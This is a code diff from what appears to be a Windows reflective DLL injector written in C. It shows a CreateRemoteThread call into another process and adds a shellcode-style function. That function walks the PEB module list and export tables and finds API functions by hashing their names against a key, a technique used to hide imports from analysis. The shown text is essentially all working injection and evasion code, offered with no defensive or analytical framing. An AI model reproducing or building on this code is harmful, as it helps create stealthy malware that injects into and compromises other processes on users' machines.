@@ -110,7 +110,6 @@ HMODULE Reflective(HANDLE hProcess, BYTE *MemoryStream)
             VirtualFreeEx(hProcess, ImageBase, 0, MEM_RELEASE);
             return NULL;
         }
-        
 
         HANDLE hThread = CreateRemoteThread(hProcess, NULL, NULL, GetModuleHandleA, SharedMemoryAddress, NULL, NULL);
 
@@ -270,30 +269,52 @@ void Failed(LPCSTR Message)
     printf("[+] ErrorMessage : %s\n", ErrorMessage);
 }
 
-// __declspec(naked) void CallDllMain(HINSTANCE hinstDLL)
-// {
-//     __asm__ __volatile__ (
-//         "push rbp\n\t"
-//         "mov rbp, rsp\n\t"
-//         "sub rsp, 0x20\n\t"
-//         "mov rdx, 0x1\n\t"
-//         "mov r8, 0x0\n\t"
-
-//         "leave\n\t"
-//         "ret\n\t"
-//     );
-// }
-
-__declspec(naked) void *SearchFunction(int Key)
+// This function is code injected(Code Injection) like shellcode
+void *SearchFunction(ULONGLONG Key)
 {
+    PEB *peb;
+    // Get PEB Address
     __asm__ __volatile__ (
-        "push rbp\n\t"
-        "mov rbp, rsp\n\t"
-        "sub rsp, 0x20\n\t"
-        "mov qword ptr ds:[rbp+0x10], rcx\n\t" // Argument 1 save
-        "mov rax, gs:[0x60]\n\t"               // Get PEB
-        "mov rax, qword ptr ds:[rax+0x30]\n\t" // Get PEB_LDR_DATA
-        "mov qword ptr ds:[rsp+0x18], rax\n\t" // Save address
-        ""
+        "mov rax, gs:[0x60]\n\t"
+        "mov %[PEB], rax\n\t"
+        : [PEB] "=m" (peb)
     );
+    // LDR_DATA_TABLE_ENTRY *LdrDataTableEntry = peb->Ldr->InLoadOrderModuleList.Flink;
+    LDR_DATA_TABLE_ENTRY *LdrDataTableEntry = *(ULONG_PTR *)((ULONG_PTR)peb->Ldr + 8 + sizeof(PVOID));
+    // PVOID Head = &peb->Ldr->InLoadOrderModuleList;
+    PVOID Head = (ULONG_PTR)peb->Ldr + 8 + sizeof(PVOID);
+    do
+    {
+        // ULONG_PTR ImageBase = LdrDataTableEntry->DllBase;
+        ULONG_PTR ImageBase = *(ULONG_PTR *)((ULONG_PTR)LdrDataTableEntry + sizeof(PVOID) * 6);
+        IMAGE_EXPORT_DIRECTORY *EXPORT = ((IMAGE_NT_HEADERS *)(((IMAGE_DOS_HEADER *)ImageBase)->e_lfanew + ImageBase))->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress + ImageBase;
+        if (EXPORT == ImageBase)
+            continue;
+
+        for (int i = 0; i < EXPORT->NumberOfNames; i++)
+        {
+            DWORD length;
+            LPCSTR FunctionName = ImageBase + *(DWORD *)(ImageBase + EXPORT->AddressOfNames + i * 4);
+            
+            // This macro function is same strlen
+            STRLEN(FunctionName, length);
+
+            unsigned long long data = 0;
+
+            for (int i = 0; i < length; i++)
+            {
+                data += FunctionName[i];
+                data = (data << (FunctionName[i] & 0x0F)) ^ data;
+            }
+
+            if (data == Key)
+            {
+                WORD Index = *(WORD *)(ImageBase + EXPORT->AddressOfNameOrdinals + i * 2);
+                return ImageBase + *(DWORD *)(ImageBase + EXPORT->AddressOfFunctions + Index * 4);
+            }
+        }
+    } while ((LdrDataTableEntry = *(ULONG_PTR *)LdrDataTableEntry) != Head);
+
+    return NULL;
 }
+void AtherFunc() {}
